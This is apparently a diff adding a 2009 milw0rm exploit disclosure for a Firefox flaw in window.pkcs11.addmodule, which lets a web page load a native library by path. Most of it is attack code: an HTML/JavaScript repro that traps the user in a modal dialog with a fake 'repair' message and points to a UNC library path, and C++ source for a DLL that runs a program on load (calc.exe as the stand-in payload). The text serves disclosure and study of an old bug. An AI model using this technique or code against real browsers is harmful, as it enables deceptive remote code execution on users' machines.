@@ -1,0 +1,67 @@
+Fix announce:   http://www.mozilla.org/security/announce/2009/mfsa2009-48.html
+Bug history: https://bugzilla.mozilla.org/show_bug.cgi?id=326628
+
+So, Firefox up through 3.0.13 had an obscure little function under window.pkcs11:
+
+ long                      addmodule(in DOMString moduleName,
+                                     in DOMString libraryFullPath,
+                                     in long cryptoMechanismFlags,
+                                     in long cipherFlags);
+
+Yes, that's actually the full path to a DLL -- or an .so on Linux/OSX --
+from a JS function that's exposed to the web.
+
+Attacker doesn't get zero click install -- there's a dialog -- but:
+
+1) Attacker does get to customize the dialog via moduleName
+2) The dialog is modal, so the user doesn't get access to Firefox again
+until they hit OK (can't even close Firefox)
+3) On Windows, he can put a UNC path in for the Library path.  There's
+probably similar on OSX and some Linux distros.  Even without, there's
+usually a way to get a file in a known location -- see John Heasman's
+Java work.
+
+LoadLibrary of Attacker library on OK.
+
+Repro:
+
+<body>
+<script>
+
+  var str = "Error detected in Firefox Module NSP31337.bin.\n" +
+           "Please click 'OK' to repair."
+
+  ret=-2;
+  while(ret!=-5){
+     ret=window.pkcs11.addmodule("\n\n\n" + str + "\n\n\n", "\\\\127.0.0.1\\c$\\
+pkunkcs", 0, 0);
+  }
+
+</script>
+
+"Shellcode" is just a DLL with ShellExecute in the constructor:
+
+CpkunkcsApp::CpkunkcsApp()
+{
+
+    char *str = "c:\\windows\\system32\\calc.exe";
+    wchar_t *wText;
+    size_t len;
+   
+    len = strlen(str)+1;
+
+    wText = new wchar_t[strlen(str)];
+    memset(wText, 0, len * sizeof(wchar_t));
+
+    ::MultiByteToWideChar(CP_ACP, NULL, str, -1, wText, len);
+
+    ShellExecute(NULL, NULL, wText, NULL, NULL, SW_SHOW);
+
+}
+
+Cheers to Jesse Ruderman, who recognized this was probably not the
+greatest of API's some time ago.  The bug history is worth taking a look
+at...goes back a while.  They missed the UNC path vector, and appear to
+have underestimated the modal dialog.
+
+# milw0rm.com [2009-09-11]
